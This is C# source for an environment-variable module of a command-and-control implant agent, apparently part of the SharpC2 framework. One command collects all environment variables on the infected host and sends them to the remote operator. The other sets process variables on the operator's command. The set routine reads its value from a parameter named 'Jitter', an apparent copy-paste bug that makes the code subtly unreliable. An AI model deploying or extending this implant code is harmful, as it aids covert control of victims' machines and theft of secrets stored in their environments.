using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections;
using System.Collections.Generic;

namespace Agent.Modules
{
    public class EnvModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Env",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Get",
                        Delegate = GetEnvironmentVariables
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Set",
                        Delegate = SetEnvironmentVariable
                    }
                }
            };
        }

        void GetEnvironmentVariables(string AgentID, AgentTask Task)
        {
            try
            {
                var result = new SharpC2ResultList<EnvironmentVariableResult>();
                var variables = Environment.GetEnvironmentVariables();

                foreach (DictionaryEntry env in variables)
                {
                    result.Add(new EnvironmentVariableResult
                    {
                        Key = env.Key as string,
                        Value = env.Value as string
                    });
                }

                Agent.SendMessage(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void SetEnvironmentVariable(string AgentID, AgentTask Task)
        {
            try
            {
                var name = (string)Task.Parameters["Name"];
                var value = (string)Task.Parameters["Jitter"];

                Environment.SetEnvironmentVariable(name, value, EnvironmentVariableTarget.Process);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}